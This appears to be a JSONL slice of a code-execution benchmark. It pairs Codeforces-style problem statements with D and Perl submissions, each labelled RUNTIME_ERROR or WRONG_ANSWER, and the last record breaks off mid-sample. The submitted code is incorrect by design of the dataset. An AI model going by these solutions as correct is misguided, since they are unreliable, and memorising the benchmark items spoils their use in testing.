{"difficulty":2200,"lang":"D","lang_cluster":"d","src_uid":"86_D","submission_id":"28010146","tags":["data+structures","implementation","math","two+pointers"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.algorithm;\r\nimport std.array;\r\nimport std.container;\r\nimport std.conv;\r\nimport std.math;\r\nimport std.range;\r\nimport std.stdio;\r\nimport std.typecons, std.traits;\r\n\r\nalias Query = Tuple!(long, \"index\", long, \"l\", long, \"r\", long, \"ans\"); \r\nvoid main() {\r\n  long[long] cnt;\r\n  long sum = 0;\r\n  int n, t;\r\n  readf(\" %d %d\\n\", &n, &t);\r\n  auto a = readln.split.map!(to!long);\r\n  auto queries = new Query[](t);\r\n  foreach(i; 0..t) {\r\n    readf(\" %d %d\", &queries[i].l, &queries[i].r);\r\n    queries[i].index = i;\r\n    queries[i].l--;\r\n  }\r\n  long k = n.intsqrt;\r\n\r\n  queries.sort!(delegate(a,b) {\r\n      if (a.l\/k < b.l\/k) return true; \r\n      return a.r < b.r;\r\n      });\r\n\r\n  int l,r;\r\n  void add(long elem) {\r\n    debug { writeln(\"add: \", elem); }\r\n    if (elem in cnt) {\r\n      sum += elem*((cnt[elem]+1)^^2 - cnt[elem]^^2);\r\n    } else {\r\n      sum += elem;\r\n    }\r\n    cnt[elem]++;\r\n  }\r\n  void del(long elem) {\r\n    debug { writeln(\"del: \", elem); }\r\n    assert(cnt[elem] > 0);\r\n    cnt[elem]--;\r\n    sum -= elem*((cnt[elem]+1)^^2 - cnt[elem]^^2);\r\n  }\r\n\r\n  foreach(ref q; queries) {\r\n    debug { writeln(\"query: \", a[q.l..q.r]); }\r\n    while (r < q.r) {\r\n      add(a[r]);\r\n      r++;\r\n    }\r\n    while (r > q.r) {\r\n      del(a[r-1]);\r\n      r--;\r\n    }\r\n    while (l < q.l) {\r\n      del(a[l]);\r\n      l++;\r\n    }\r\n    while (l > q.l) {\r\n      add(a[l]);\r\n      l--;\r\n    }\r\n    q.ans = sum;\r\n  }\r\n  queries.sort!((a,b) => a.index < b.index);\r\n  queries.each!(a => writeln(a.ans));\r\n}\r\n\r\nT intsqrt(T)(T i) {\r\n   T bitMask = 1;\r\n   T result = 0;\r\n\r\n   bitMask <<= T.sizeof * 4 - 1;\r\n\r\n   while (bitMask) {\r\n       result |= bitMask;\r\n       if ((result * result) > i) {\r\n           result &= ~bitMask;\r\n       }\r\n       bitMask >>= 1;\r\n   }\r\n\r\n   return result;\r\n}","description":"An array of positive integers a1,a2,...,an is given. Let us consider its arbitrary subarray al,al+1...,ar, where 1\u2264l\u2264r\u2264n. For every positive integer s denote by Ks the number of occurrences of s into the subarray. We call the power of the subarray the sum of products Ks\u00b7Ks\u00b7s for every positive integer s. The sum contains only finite number of nonzero summands as the number of different values in the array is indeed finite.You should calculate the power of t given subarrays.","input_from":"standard input","output_to":"standard output","input_spec":"First line contains two integers n and t (1\u2264n,t\u2264200000) \u2014 the array length and the number of queries correspondingly.\nSecond line contains n positive integers ai (1\u2264ai\u226410^6) \u2014 the elements of the array.\nNext t lines contain two positive integers l, r (1\u2264l\u2264r\u2264n) each \u2014 the indices of the left and the right ends of the corresponding subarray.\n","output_spec":"Output t lines, the i-th line of the output should contain single positive integer \u2014 the power of the i-th query subarray.\nPlease, do not use %lld specificator to read or write 64-bit integers in C++. It is preferred to use cout stream (also you may use %I64d).\n","notes":"Consider the following array (see the second sample) and its [2, 7] subarray (elements of the subarray are colored): \n\n Then K1=3, K2=2, K3=1, so the power is equal to 3^2\u00b71+2^2\u00b72+1^2\u00b73=20.","sample_inputs":["3 2\n1 2 1\n1 2\n1 3\n","8 3\n1 1 2 2 1 3 1 1\n2 7\n1 6\n2 7\n"],"sample_outputs":["3\n6\n","20\n20\n20\n"]}
{"difficulty":2400,"lang":"D","lang_cluster":"d","src_uid":"983_C","submission_id":"38308840","tags":["dp","graphs","shortest+paths"],"exec_outcome":"RUNTIME_ERROR","source_code":"import std.stdio, std.array, std.string, std.conv, std.algorithm;\nimport std.typecons, std.range, std.random, std.math, std.container;\nimport std.numeric, std.bigint, core.bitop, std.bitmanip;\n\nvoid main() {\n    immutable int INF = 1 << 29;\n\n    int[] unfold(int n) {\n        return [n \/ 1000 % 10, n \/ 100 % 10, n \/ 10 % 10, n % 10];\n    }\n\n    int fold(int[] a) {\n        int[] b = a.dup;\n        b.sort!\"a > b\";\n        return b[0] + b[1] * 10 + b[2] * 100 + b[3] * 1000;\n    }\n    \n    auto N = readln.chomp.to!int;\n    auto src = new int[](N);\n    auto dst = new int[](N);\n    foreach (i; 0..N) {\n        auto s = readln.split.map!(to!int);\n        src[i] = s[0];\n        dst[i] = s[1];\n    }\n\n    auto dp = new int[][](N+1, 10000);\n    foreach (i; 0..N+1) dp[i].fill(INF);\n    dp[0][0] = 0;\n\n    foreach (i; 0..N) {\n        int cur = i == 0 ? 1 : src[i-1];\n        int tar = src[i];\n        foreach (a; 0..10) {\n            foreach (b; a..10) {\n                foreach (c; b..10) {\n                    foreach (d; c..10) {\n                        foreach (k; 1..10) {\n                            int[] v = [a, b, c, d];\n                            int fv = fold(v);\n                            if (dp[i][fv] >= INF) continue;\n                            int hi = max(cur, tar, k);\n                            int lo = min(cur, tar, k);\n                            int cost = 1;\n                            foreach (j; 0..4) if (lo <= v[j] && v[j] <= hi) v[j] = 0, cost += 1;\n                            int z = -1;\n                            foreach (j; 0..4) if (v[j] == 0) z = j;\n                            if (z == -1) continue;\n                            v[z] = dst[i];\n                            int dist = abs(cur - k) + abs(k - tar);\n                            dp[i+1][fv] = min(dp[i+1][fv], dp[i][d + c*10 + b*100 + a*1000] + dist + cost);\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n\n    int ans = INF;\n    \n    foreach (a; 0..10) {\n        foreach (b; a..10) {\n            foreach (c; b..10) {\n                foreach (d; c..10) {\n                    int[] v = [a, b, c, d];\n                    if (v.all!\"a == 0\") {\n                        ans = min(ans, dp[N][0]);\n                        continue;\n                    }\n                    int hi = (src.back, v.filter!\"a != 0\".reduce!max);\n                    int lo = (src.back, v.filter!\"a != 0\".reduce!min);\n                    int cost = (a != 0) + (b != 0) + (c != 0) + (d != 0);\n                    int dist = min(abs(src.back - hi) + abs(hi - lo), abs(src.back - lo) + abs(lo - hi));\n                    ans = min(ans, dp[N][fold([a, b, c, d])] + dist + cost);\n                }\n            }\n        }\n    }\n\n    ans.writeln;\n}\n","description":"You work in a big office. It is a 9\u00a0floor building with an elevator that can accommodate up to 4\u00a0people. It is your responsibility to manage this elevator.Today you are late, so there are queues on some floors already. For each person you know the floor where he currently is and the floor he wants to reach. Also, you know the order in which people came to the elevator.According to the company's rules, if an employee comes to the elevator earlier than another one, he has to enter the elevator earlier too (even if these employees stay on different floors). Note that the employees are allowed to leave the elevator in arbitrary order.The elevator has two commands:   Go up or down one floor. The movement takes 1 second.  Open the doors on the current floor. During this operation all the employees who have reached their destination get out of the elevator. Then all the employees on the floor get in the elevator in the order they are queued up while it doesn't contradict the company's rules and there is enough space in the elevator. Each employee spends 1 second to get inside and outside the elevator. Initially the elevator is empty and is located on the floor 1.You are interested what is the minimum possible time you need to spend to deliver all the employees to their destination. It is not necessary to return the elevator to the floor 1.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u22642000)\u00a0\u2014 the number of employees.\nThe i-th of the next n lines contains two integers ai and bi (1\u2264ai,bi\u22649, ai\u2260bi)\u00a0\u2014 the floor on which an employee initially is, and the floor he wants to reach.\nThe employees are given in the order they came to the elevator.\n","output_spec":"Print a single integer\u00a0\u2014 the minimal possible time in seconds.\n","notes":" Explaination for the first sample  t=0 t=2\n t=3\n t=5\n t=6\n t=7\n t=9\n t=10\n\n","sample_inputs":["2\n3 5\n5 3\n","2\n5 3\n3 5\n"],"sample_outputs":["10","12"]}
{"difficulty":1600,"lang":"D","lang_cluster":"d","src_uid":"992_B","submission_id":"50339962","tags":["math","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"import core.bitop, std.bitmanip;\r\nimport std.algorithm, std.functional;\r\nimport std.array, std.container;\r\nimport std.conv;\r\nimport std.math, std.numeric;\r\nimport std.range, std.range.interfaces;\r\nimport std.stdio, std.string;\r\nimport std.typecons;\r\n\r\nimmutable int INF = 10L ^^ 9 + 23;\r\n\r\nvoid main()\r\n{\r\n    int le, r, x, y;\r\n    readf(\"%s %s %s %s\", &le, &r, &x, &y);\r\n    readln;\r\n    \r\n    int g = y \/ x;\r\n    \r\n    int[] dvs;\r\n    int k = 2;\r\n    while (g > 1 && k <= g \/ k) {\r\n        while (g % k == 0) {\r\n            dvs ~= k;\r\n            g \/= k;\r\n        }\r\n        k += 1;\r\n    }\r\n    if (g > 1) dvs ~= g;\r\n    \r\n    int mx = 1 << dvs.length;\r\n    bool[int] chckd;\r\n    int ans = 0;\r\n    for (int i = 0; i < mx; ++i) {\r\n        int a = x, b = x;\r\n        for (int j = 0; j < dvs.length; ++j) {\r\n            if (i & (1 << j)) {\r\n                a *= dvs[j];\r\n            } else {\r\n                b *= dvs[j];\r\n            }\r\n        }\r\n        \r\n        if (chckd.get(a, false)) continue;\r\n        if (a < le || a > r) continue;\r\n        if (b < le || b > r) continue;\r\n        if (gcd(a, b) != x) continue;\r\n        \r\n        ++ans;\r\n        chckd[a] = true;\r\n        debug { a.writeln; }\r\n    }\r\n    \r\n    ans.writeln;\r\n}","description":"Today on Informatics class Nastya learned about GCD and LCM (see links below). Nastya is very intelligent, so she solved all the tasks momentarily and now suggests you to solve one of them as well.We define a pair of integers (a,b) good, if GCD(a,b)=x and LCM(a,b)=y, where GCD(a,b) denotes the greatest common divisor of a and b, and LCM(a,b) denotes the least common multiple of a and b.You are given two integers x and y. You are to find the number of good pairs of integers (a,b) such that l\u2264a,b\u2264r. Note that pairs (a,b) and (b,a) are considered different if a\u2260b.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains four integers l,r,x,y (1\u2264l\u2264r\u226410^9, 1\u2264x\u2264y\u226410^9).\n","output_spec":"In the only line print the only integer\u00a0\u2014 the answer for the problem.\n","notes":"In the first example there are two suitable good pairs of integers (a,b): (1,2) and (2,1).\nIn the second example there are four suitable good pairs of integers (a,b): (1,12), (12,1), (3,4) and (4,3).\nIn the third example there are good pairs of integers, for example, (3,30), but none of them fits the condition l\u2264a,b\u2264r.\n","sample_inputs":["1 2 1 2\n","1 12 1 12\n","50 100 3 30\n"],"sample_outputs":["2\n","4\n","0\n"]}
{"difficulty":1000,"lang":"Perl","lang_cluster":"perl","src_uid":"106_A","submission_id":"1240245","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"\n\nsub greater{\n\t$a = $_[0];\n\t$b = $_[1];\n\t\n\t$a =~ tr\/[T,J,Q,K,A]\/[1,2,3,4,5]\/;\n\t$b =~ tr\/[T,J,Q,K,A]\/[1,2,3,4,5]\/;\n\t\n\t$a = ($a + 4) % 10;\n\t$b = ($b + 4) % 10;\n\n\treturn ($a > $b);\n\n}\n\n\n$trump = split(\/\/, <>);\n($rank1, $suit1, $dummy, $rank2, $suit2)= split(\/\/, <>);\n \nif(($suit1 == $trump) or($suit1 == $suit2 and greater($rank1, $rank2))){\n\tprint \"YES\";\n}else{\n\tprint \"NO\";\n}\n","description":"There is a card game called \"Durak\", which means \"Fool\" in Russian. The game is quite popular in the countries that used to form USSR. The problem does not state all the game's rules explicitly \u2014 you can find them later yourselves if you want.To play durak you need a pack of 36 cards. Each card has a suit (\"S\", \"H\", \"D\" and \"C\") and a rank (in the increasing order \"6\", \"7\", \"8\", \"9\", \"T\", \"J\", \"Q\", \"K\" and \"A\"). At the beginning of the game one suit is arbitrarily chosen as trump. The players move like that: one player puts one or several of his cards on the table and the other one should beat each of them with his cards.A card beats another one if both cards have similar suits and the first card has a higher rank then the second one. Besides, a trump card can beat any non-trump card whatever the cards\u2019 ranks are. In all other cases you can not beat the second card with the first one.You are given the trump suit and two different cards. Determine whether the first one beats the second one or not.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the tramp suit. It is \"S\", \"H\", \"D\" or \"C\".\nThe second line contains the description of the two different cards. Each card is described by one word consisting of two symbols. The first symbol stands for the rank (\"6\", \"7\", \"8\", \"9\", \"T\", \"J\", \"Q\", \"K\" and \"A\"), and the second one stands for the suit (\"S\", \"H\", \"D\" and \"C\").\n","output_spec":"Print \"YES\" (without the quotes) if the first cards beats the second one. Otherwise, print \"NO\" (also without the quotes).\n","notes":null,"sample_inputs":["H\nQH 9S\n","S\n8D 6D\n","C\n7H AS\n"],"sample_outputs":["YES\n","YES","NO"]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"110_A","submission_id":"26710368","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\n\nuse 5.012;\nuse warnings;\n\nchomp(my $n = <>);\nprint ((length $n) =~ \/^[47]+$\/ ? 'YES' : 'NO');\n","description":"Petya loves lucky numbers. We all know that lucky numbers are the positive integers whose decimal representations contain only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Unfortunately, not all numbers are lucky. Petya calls a number nearly lucky if the number of lucky digits in it is a lucky number. He wonders whether number n is a nearly lucky number.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains an integer n (1\u2264n\u226410^18).\nPlease do not use the %lld specificator to read or write 64-bit numbers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specificator.\n","output_spec":"Print on the single line \"YES\" if n is a nearly lucky number. Otherwise, print \"NO\" (without the quotes).\n","notes":"In the first sample there are 3 lucky digits (first one and last two), so the answer is \"NO\".\nIn the second sample there are 7 lucky digits, 7 is lucky number, so the answer is \"YES\".\nIn the third sample there are no lucky digits, so the answer is \"NO\".\n","sample_inputs":["40047\n","7747774\n","1000000000000000000\n"],"sample_outputs":["NO\n","YES\n","NO\n"]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"112_A","submission_id":"6461447","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\n\n$s1 = <STDIN>;\n$s2 = <STDIN>;\n\n$s1 gt $s2 && print 1;\n$s1 lt $s2 && print -1;\n$s1 eq $s2 && print 0;\n","description":"Little Petya loves presents. His mum bought him two strings of the same size for his birthday. The strings consist of uppercase and lowercase Latin letters. Now Petya wants to compare those two strings lexicographically. The letters' case does not matter, that is an uppercase letter is considered equivalent to the corresponding lowercase letter. Help Petya perform the comparison.","input_from":"standard input","output_to":"standard output","input_spec":"Each of the first two lines contains a bought string. The strings' lengths range from 1 to 100 inclusive. It is guaranteed that the strings are of the same length and also consist of uppercase and lowercase Latin letters.\n","output_spec":"If the first string is less than the second one, print \"-1\". If the second string is less than the first one, print \"1\". If the strings are equal, print \"0\". Note that the letters' case is not taken into consideration when the strings are compared.\n","notes":"If you want more formal information about the lexicographical order (also known as the \"dictionary order\" or \"alphabetical order\"), you can visit the following site:\n http:\/\/en.wikipedia.org\/wiki\/Lexicographical_order","sample_inputs":["aaaa\naaaA\n","abs\nAbz\n","abcdefg\nAbCdEfF\n"],"sample_outputs":["0\n","-1\n","1\n"]}
{"difficulty":1200,"lang":"Perl","lang_cluster":"perl","src_uid":"112_B","submission_id":"5489068","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"<>=~\/ (\\d+) \/;\r\nprint (($`\/2 - $1)*($`\/2 - $')*($`\/2 - $1+1)*($`\/2 - $'+1)?\"YES\":\"NO\")","description":"Little Petya loves playing with squares. Mum bought him a square 2n\u00d72n in size. Petya marked a cell inside the square and now he is solving the following task.The task is to draw a broken line that would go along the grid lines and that would cut the square into two equal parts. The cutting line should not have any common points with the marked cell and the resulting two parts should be equal up to rotation.Petya wants to determine whether it is possible to cut the square in the required manner given the sizes of the square side and the coordinates of the marked cell. Help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers 2n, x and y (2\u22642n\u2264100,1\u2264x,y\u22642n), representing the length of a square's side and the coordinates of the marked cell. It is guaranteed that 2n is even.\nThe coordinates of the marked cell are represented by a pair of numbers x y, where x represents the number of the row and y represents the number of the column. The rows and columns are numbered by consecutive integers from 1 to 2n. The rows are numbered from top to bottom and the columns are numbered from the left to the right.\n","output_spec":"If the square is possible to cut, print \"YES\", otherwise print \"NO\" (without the quotes).\n","notes":"A sample test from the statement and one of the possible ways of cutting the square are shown in the picture: \n \n","sample_inputs":["4 1 1\n","2 2 2\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":1000,"lang":"Perl","lang_cluster":"perl","src_uid":"114_A","submission_id":"5409319","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"use bignum;\r\n$a=<>;\r\n$b=<>;\r\n$i=$a;\r\nwhile($a<$b){\r\n$a*=$i, $c++;\r\n}\r\nprint $a-$b?\"NO\":\"YES\\n$c\"","description":"When Petya went to school, he got interested in large numbers and what they were called in ancient times. For instance, he learned that the Russian word \"tma\" (which now means \"too much to be counted\") used to stand for a thousand and \"tma tmyschaya\" (which literally means \"the tma of tmas\") used to stand for a million.Petya wanted to modernize the words we use for numbers and invented a word petricium that represents number k. Moreover, petricium la petricium stands for number k^2, petricium la petricium la petricium stands for k^3 and so on. All numbers of this form are called petriciumus cifera, and the number's importance is the number of articles la in its title.Petya's invention brought on a challenge that needed to be solved quickly: does some number l belong to the set petriciumus cifera? As Petya is a very busy schoolboy he needs to automate the process, he asked you to solve it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer number k, the second line contains integer number l (2\u2264k,l\u22642^31-1).\n","output_spec":"You should print in the first line of the output \"YES\", if the number belongs to the set petriciumus cifera and otherwise print \"NO\". If the number belongs to the set, then print on the seconds line the only number \u2014 the importance of number l.\n","notes":null,"sample_inputs":["5\n25\n","3\n8\n"],"sample_outputs":["YES\n1\n","NO\n"]}
{"difficulty":1000,"lang":"Perl","lang_cluster":"perl","src_uid":"122_A","submission_id":"46702360","tags":["brute+force","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"$.=<>;$\/=0;for((4,7,47,74,447)){$.==$_||!($.%$_)?$\/++:$\/};print$\/?YES:NO","description":"Petya loves lucky numbers. Everybody knows that lucky numbers are positive integers whose decimal representation contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya calls a number almost lucky if it could be evenly divided by some lucky number. Help him find out if the given number n is almost lucky.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains an integer n (1\u2264n\u22641000) \u2014 the number that needs to be checked.\n","output_spec":"In the only line print \"YES\" (without the quotes), if number n is almost lucky. Otherwise, print \"NO\" (without the quotes).\n","notes":"Note that all lucky numbers are almost lucky as any number is evenly divisible by itself.\nIn the first sample 47 is a lucky number. In the second sample 16 is divisible by 4.\n","sample_inputs":["47\n","16\n","78\n"],"sample_outputs":["YES\n","YES\n","NO\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"129_A","submission_id":"1744067","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!perl\n$scookies = <STDIN>;\n@cookies = split(\/\\D\/,$scookies);\n$odd = $even = 0;\nforeach $i (@cookies) {\n\tif ($i % 2) {\n\t\t$odd++;\n\t} else {\n\t\t$even++;\n\t}\n}\n$result = ($odd % 2)? $odd: $even;\nprint $result;\n","description":"Olga came to visit the twins Anna and Maria and saw that they have many cookies. The cookies are distributed into bags. As there are many cookies, Olga decided that it's no big deal if she steals a bag. However, she doesn't want the sisters to quarrel because of nothing when they divide the cookies. That's why Olga wants to steal a bag with cookies so that the number of cookies in the remaining bags was even, that is, so that Anna and Maria could evenly divide it into two (even 0 remaining cookies will do, just as any other even number). How many ways there are to steal exactly one cookie bag so that the total number of cookies in the remaining bags was even?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u2264100) \u2014 the number of cookie bags Anna and Maria have. The second line contains n integers ai (1\u2264ai\u2264100) \u2014 the number of cookies in the i-th bag.\n","output_spec":"Print in the only line the only number \u2014 the sought number of ways. If there are no such ways print 0.\n","notes":"In the first sample Olga should take the only bag so that the twins ended up with the even number of cookies.\nIn the second sample Olga can take any of five bags with two cookies or any of three bags with four cookies \u2014 5+3=8 ways in total.\nIn the third sample, no matter which bag with two cookies Olga chooses, the twins are left with 2*9+99=117 cookies. Thus, Olga has only one option: to take the bag with 99 cookies.\n","sample_inputs":["1\n1\n","10\n1 2 2 3 4 4 4 2 2 2\n","11\n2 2 2 2 2 2 2 2 2 2 99\n"],"sample_outputs":["1\n","8\n","1\n"]}
{"difficulty":900,"lang":"Perl","lang_cluster":"perl","src_uid":"133_A","submission_id":"27630780","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"\r\n\r\n#!perl -pl\r\n$_ = y\/HQ9\/\/ ? \"YES\" : \"NO\"","description":"HQ9+ is a joke programming language which has only four one-character instructions: \"H\" prints \"Hello, World!\", \"Q\" prints the source code of the program itself, \"9\" prints the lyrics of \"99 Bottles of Beer\" song,  \"+\" increments the value stored in the internal accumulator.Instructions \"H\" and \"Q\" are case-sensitive and must be uppercase. The characters of the program which are not instructions are ignored.You are given a program written in HQ9+. You have to figure out whether executing this program will produce any output.","input_from":"standard input","output_to":"standard output","input_spec":"The input will consist of a single line p which will give a program in HQ9+. String p will contain between 1 and 100 characters, inclusive. ASCII-code of each character of p will be between 33 (exclamation mark) and 126 (tilde), inclusive.\n","output_spec":"Output \"YES\", if executing the program will produce any output, and \"NO\" otherwise.\n","notes":"In the first case the program contains only one instruction \u2014 \"H\", which prints \"Hello, World!\".\nIn the second case none of the program characters are language instructions.\n","sample_inputs":["Hi!\n","Codeforces\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"146_A","submission_id":"1111923","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl -w\r\n\r\nuse strict;\r\n\r\nwhile (<STDIN>) {\r\n    chomp;\r\n    s\/(.*)\/($1)\/ if s\/^-\/\/;\r\n    s\/^(\\(*)\/$1\\$\/;\r\n    s\/(\\d+)(\\D*)\/$1.$2\/ unless m\/\\.\/;\r\n    s\/\\.(\\d*)\/\\.${1}00\/;\r\n    s\/(\\.\\d{2})\\d*\/$1\/;\r\n    0 while s\/(\\d)(\\d{3}[\\.,])\/$1,$2\/;\r\n    s\/(.*)\/$1\\n\/;\r\n    print;\r\n}\r\n","description":"Petya loves lucky numbers very much. Everybody knows that lucky numbers are positive integers whose decimal record contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Petya loves tickets very much. As we know, each ticket has a number that is a positive integer. Its length equals n (n is always even). Petya calls a ticket lucky if the ticket's number is a lucky number and the sum of digits in the first half (the sum of the first n\/2 digits) equals the sum of digits in the second half (the sum of the last n\/2 digits). Check if the given ticket is lucky.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an even integer n (2\u2264n\u226450) \u2014 the length of the ticket number that needs to be checked. The second line contains an integer whose length equals exactly n \u2014 the ticket number. The number may contain leading zeros.\n","output_spec":"On the first line print \"YES\" if the given ticket number is lucky. Otherwise, print \"NO\" (without the quotes).\n","notes":"In the first sample the sum of digits in the first half does not equal the sum of digits in the second half (4\u22607).\nIn the second sample the ticket number is not the lucky number.\n","sample_inputs":["2\n47\n","4\n4738\n","4\n4774\n"],"sample_outputs":["NO\n","NO\n","YES\n"]}
{"difficulty":800,"lang":"Perl","lang_cluster":"perl","src_uid":"157_A","submission_id":"1259100","tags":["brute+force"],"exec_outcome":"RUNTIME_ERROR","source_code":"$n=<STDIN>;\r\nforeach $i (0..$n-1){\r\n    @field[$i]=[split(\" \",<STDIN>)];\r\n}\r\nmy @gor;\r\nmy @vert;\r\nmy $schet=0;\r\n\r\nforeach $i (0..$n-1){\r\n    foreach $j(0..$n-1){\r\n        $gor[$i]+=$field[$i][$j];\r\n        $vert[$j]+=$field[$i][$j];\r\n    }\r\n}\r\n\r\nforeach $i (0..$n-1){\r\n    foreach $j(0..$n-1){\r\n        #print $gor[$i].\"   field=\".($field[$i]->[$j]).\"   vert=\".$vert[$j].\"\\n\";\r\n        if ($gor[$i]-($field[$i][$j])<$vert[$j]-($field[$i][$j])){\r\n            $schet+=1;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nprint $schet;\r\n","description":"Sherlock Holmes and Dr. Watson played some game on a checkered board n\u00d7n in size. During the game they put numbers on the board's squares by some tricky rules we don't know. However, the game is now over and each square of the board contains exactly one number. To understand who has won, they need to count the number of winning squares. To determine if the particular square is winning you should do the following. Calculate the sum of all numbers on the squares that share this column (including the given square) and separately calculate the sum of all numbers on the squares that share this row (including the given square). A square is considered winning if the sum of the column numbers is strictly greater than the sum of the row numbers.For instance, lets game was ended like is shown in the picture. Then the purple cell is winning, because the sum of its column numbers equals 8+3+6+7=24, sum of its row numbers equals 9+5+3+2=19, and 24>19.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (1\u2264n\u226430). Each of the following n lines contain n space-separated integers. The j-th number on the i-th line represents the number on the square that belongs to the j-th column and the i-th row on the board. All number on the board are integers from 1 to 100.\n","output_spec":"Print the single number \u2014 the number of the winning squares.\n","notes":"In the first example two upper squares are winning.\nIn the third example three left squares in the both middle rows are winning:\n5 7 8 4\n9 5 3 2\n1 6 6 4\n9 5 7 3\n","sample_inputs":["1\n1\n","2\n1 2\n3 4\n","4\n5 7 8 4\n9 5 3 2\n1 6 6 4\n9 5 7 3\n"],"sample_outputs":["0\n","2\n","6\n"]}
{"difficulty":1300,"lang":"Perl","lang_cluster":"perl","src_uid":"158_D","submission_id":"1719207","tags":["*special","brute+force","number+theory"],"exec_outcome":"WRONG_ANSWER","source_code":"#!\/usr\/bin\/perl\r\n# Codeforces Practice - 26 May 2012\r\nuse strict;\r\nuse warnings;\r\n\r\n\r\nmy $n = <STDIN>;\r\nchomp($n);\r\n\r\nmy @tis = split(\" \",<STDIN>);\r\nmy $tSum =0;\r\n$tSum += $_ for @tis;\r\nif($n%2==1 || $n<6) {print $tSum;}\r\nelse {\r\nmy ($sum1,$sum2) = (0,0);\r\nmy $toggle = 0;\r\nforeach my $t (@tis) {\r\n    if($toggle){\r\n        $sum1 += $t;\r\n    } else {\r\n        $sum2 += $t;\r\n    }\r\n    $toggle = not $toggle;\r\n}\r\nif($sum1 >= $tSum && $sum1 >= $sum2){print $sum1;}\r\nelsif($sum2 >= $tSum && $sum2 >= $sum1){print $sum2;}\r\nelse {print $tSum;}\r\n}\r\n","description":"The Berland University is preparing to celebrate the 256-th anniversary of its founding! A specially appointed Vice Rector for the celebration prepares to decorate the campus. In the center of the campus n ice sculptures were erected. The sculptures are arranged in a circle at equal distances from each other, so they form a regular n-gon. They are numbered in clockwise order with numbers from 1 to n.The site of the University has already conducted a voting that estimated each sculpture's characteristic of ti \u2014 the degree of the sculpture's attractiveness. The values of ti can be positive, negative or zero.When the university rector came to evaluate the work, he said that this might be not the perfect arrangement. He suggested to melt some of the sculptures so that:   the remaining sculptures form a regular polygon (the number of vertices should be between 3 and n),  the sum of the ti values of the remaining sculptures is maximized. Help the Vice Rector to analyze the criticism \u2014 find the maximum value of ti sum which can be obtained in this way. It is allowed not to melt any sculptures at all. The sculptures can not be moved.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (3\u2264n\u226420000) \u2014 the initial number of sculptures. The second line contains a sequence of integers t1,t2,...,tn, ti \u2014 the degree of the i-th sculpture's attractiveness (-1000\u2264ti\u22641000). The numbers on the line are separated by spaces.\n","output_spec":"Print the required maximum sum of the sculptures' attractiveness.\n","notes":"In the first sample it is best to leave every second sculpture, that is, leave sculptures with attractivenesses: 2, 4, 5 \u0438 3.\n","sample_inputs":["8\n1 2 -3 4 -5 5 2 3\n","6\n1 -2 3 -4 5 -6\n","6\n1 2 3 4 5 6\n"],"sample_outputs":["14\n","9\n","21\n"]}
{"difficulty":1200,"lang":"Perl","lang_cluster":"perl","src_uid":"15_A","submission_id":"11085063","tags":["implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"($n, $t) = split(\/ \/, <>);\r\n$t += $t;\r\nfor $i (1..$n) {\r\n    ($x, $a) = split(\/ \/, <>);\r\n    $x += $x;\r\n    push @arr, [$x-$a, $x+$a];\r\n}\r\n@arr = sort {$a[0] cmp $b[0]} @arr;\r\n$ans = 2;\r\nfor $i (1..$n-1) {\r\n    $pr = $arr[$i-1][1];\r\n    $cl = $arr[$i][0];\r\n    $ans += $cl >  $pr+$t ? 2:\r\n            $cl == $pr+$t ? 1:0;\r\n}\r\nprint \"$ans\\n\";\r\n","description":"A new cottage village called \u00abFlatville\u00bb is being built in Flatland. By now they have already built in \u00abFlatville\u00bb n square houses with the centres on the \u041ex-axis. The houses' sides are parallel to the coordinate axes. It's known that no two houses overlap, but they can touch each other.The architect bureau, where Peter works, was commissioned to build a new house in \u00abFlatville\u00bb. The customer wants his future house to be on the \u041ex-axis, to be square in shape, have a side t, and touch at least one of the already built houses. For sure, its sides should be parallel to the coordinate axes, its centre should be on the Ox-axis and it shouldn't overlap any of the houses in the village.Peter was given a list of all the houses in \u00abFlatville\u00bb. Would you help him find the amount of possible positions of the new house?","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains numbers n and t (1\u2264n,t\u22641000). Then there follow n lines, each of them contains two space-separated integer numbers: xi ai, where xi \u2014 x-coordinate of the centre of the i-th house, and ai \u2014 length of its side (-1000\u2264xi\u22641000, 1\u2264ai\u22641000).\n","output_spec":"Output the amount of possible positions of the new house.\n","notes":"It is possible for the x-coordinate of the new house to have non-integer value.\n","sample_inputs":["2 2\n0 